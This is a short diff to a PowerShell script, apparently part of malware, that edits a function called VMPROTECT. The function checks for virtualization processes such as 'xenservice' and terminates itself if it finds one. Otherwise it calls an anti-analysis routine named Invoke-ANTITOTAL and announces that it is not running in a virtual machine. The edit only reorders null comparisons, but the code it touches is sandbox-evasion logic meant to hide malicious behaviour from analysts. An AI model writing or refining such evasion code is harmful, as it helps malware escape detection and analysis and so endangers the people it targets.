@@ -124,12 +124,12 @@ function VMPROTECT {
         "xenservice"
     )
     $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-    if ($null -ne $detectedProcesses) {
+    if ($detectedProcesses -ne $null) {
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
         Stop-Process $pid -Force
     }
 
-    if ($null -eq $detectedProcesses) {
+    if ($detectedProcesses -eq $null) {
         Invoke-ANTITOTAL
         Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
     }
